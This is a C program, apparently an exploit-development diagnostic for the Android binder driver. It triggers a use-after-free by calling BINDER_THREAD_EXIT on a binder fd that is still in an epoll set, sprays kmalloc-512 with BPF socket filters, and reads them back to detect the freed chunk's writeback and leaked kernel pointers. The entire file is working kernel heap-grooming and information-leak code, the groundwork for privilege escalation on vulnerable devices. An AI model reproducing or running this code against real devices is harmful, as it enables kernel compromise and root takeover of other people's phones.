/*
 * diag3: where does the freed binder chunk C go? (kmalloc-512 forensics)
 *
 * Logic: kmemdup#2 pops+frees every attach, so if C were ANYWHERE in the
 * current per-cpu kmalloc-512 freelist, within 2 attaches C would be under
 * an orig_prog (kmemdup#1) and close(epfd) writeback would be visible in
 * its readback. Zero hits == C is NOT on the current per-cpu chain.
 *
 * Phase A: 300 rounds x 1 attach  (tests plain LIFO fastpath)
 * Phase B:  20 rounds x 100 attach (forces get_partial/new_slab churn)
 *
 * Hit signals in a readback:
 *   lock word @chunk+0x98 = insn19: canary 0x00060006 -> close bumps to
 *   0x00070006 (jt byte 0x06 -> 0x07)
 *   kptr @chunk+0xA0/0xA8 = insn20/21 (list_del writeback)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define BINDER_THREAD_EXIT 0x40046208
#define BINDER_VERSION     0xc0046209
#ifndef SO_ATTACH_FILTER
#define SO_ATTACH_FILTER 1
#endif
#ifndef SO_GET_FILTER
#define SO_GET_FILTER 77
#endif
#ifndef __NR_sched_setaffinity
#define __NR_sched_setaffinity 122
#endif

struct sf { unsigned short code; unsigned char jt, jf; unsigned int k; };
struct sfp { unsigned short len; struct sf *f; };

#define NINSNS   62
#define LOCK_INSN 19
#define MAXSOCK  128

static struct sf insns[NINSNS];
static struct sfp prog;
static int socks[MAXSOCK];

static void show_cpu(void)
{
    unsigned long long mask = 1;
    int ret;
    errno = 0;
    ret = syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
    printf("sched_setaffinity(0->cpu0): ret=%d errno=%d (%s)\n",
           ret, errno, ret ? strerror(errno) : "ok");

    char line[256];
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        while (fgets(line, sizeof(line), f))
            if (!strncmp(line, "Cpus_allowed_list", 17)) { printf("  %s", line); break; }
        fclose(f);
    }
    f = fopen("/proc/self/stat", "r");
    if (f) {
        char buf[1024];
        if (fgets(buf, sizeof(buf), f)) {
            char *p = strrchr(buf, ')');
            if (p) {
                int fld = 1, cpu = -1;
                for (char *t = strtok(p + 1, " "); t; t = strtok(NULL, " ")) {
                    fld++;
                    if (fld == 39) { cpu = atoi(t); break; }
                }
                printf("  current cpu = %d\n", cpu);
            }
        }
        fclose(f);
    }
}

/* run one round with nsock attaches; returns number of observed hits */
static int run_round(int tag, int nsock)
{
    int fd = -1, epfd = -1, n = 0, hits = 0;
    int ver = 0;
    struct epoll_event ev;

    /* all non-BPF allocations first so they never race for C */
    for (int i = 0; i < nsock; i++) {
        socks[n] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (socks[n] < 0) break;
        n++;
    }

    epfd = epoll_create1(0);
    fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0 || epfd < 0) goto out;
    if (ioctl(fd, BINDER_VERSION, &ver) < 0) goto out;

    ev.events = EPOLLIN; ev.data.fd = fd;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) goto out;
    if (ioctl(fd, BINDER_THREAD_EXIT, 0) < 0) goto out;

    for (int i = 0; i < n; i++) {
        prog.f->k = 0x22000000u + (unsigned)i;   /* unique marker */
        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0)
            break;
    }

    close(epfd);            /* the writeback (if any) */
    epfd = -1;

    for (int i = 0; i < n; i++) {
        unsigned char back[NINSNS * 8];
        socklen_t blen = sizeof(back);
        if (getsockopt(socks[i], SOL_SOCKET, SO_GET_FILTER, back, &blen) < 0) continue;
        unsigned char jt = back[LOCK_INSN * 8 + 1];
        unsigned long long a0, a1;
        memcpy(&a0, back + 20 * 8, 8);
        memcpy(&a1, back + 21 * 8, 8);
        int lockhit = (jt == 0x07);          /* canary bump: 06 -> 07 */
        int kptr = (a0 >> 48) == 0xffffULL || (a1 >> 48) == 0xffffULL;
        if (lockhit || kptr) {
            hits++;
            printf("R%d sock%d: jt=0x%02x insn20=%016llx insn21=%016llx\n",
                   tag, i, jt, a0, a1);
        }
    }
out:
    for (int i = 0; i < n; i++) close(socks[i]);
    if (fd >= 0) close(fd);
    if (epfd >= 0) close(epfd);
    return hits;
}

int main(void)
{
    static char outbuf[1 << 16];
    setvbuf(stdout, outbuf, _IOFBF, sizeof(outbuf));
    show_cpu();

    for (int i = 0; i < NINSNS; i++) {
        insns[i].code = 0x0006; insns[i].jt = 0; insns[i].jf = 0;
        insns[i].k = 0x22000000;
    }
    insns[LOCK_INSN].code = 0x0006; insns[LOCK_INSN].jt = 0x06;
    insns[LOCK_INSN].jf = 0x00; insns[LOCK_INSN].k = 0x22150006;
    prog.len = NINSNS; prog.f = insns;

    int hits = 0;
    printf("== Phase A: 300 rounds x 1 attach ==\n");
    for (int r = 0; r < 300; r++) hits += run_round(r, 1);
    printf("Phase A total hits: %d/300\n", hits);

    hits = 0;
    printf("== Phase B: 20 rounds x 100 attach ==\n");
    for (int r = 0; r < 20; r++) hits += run_round(1000 + r, 100);
    printf("Phase B total hits: %d/20\n", hits);

    fflush(stdout);
    return 0;
}
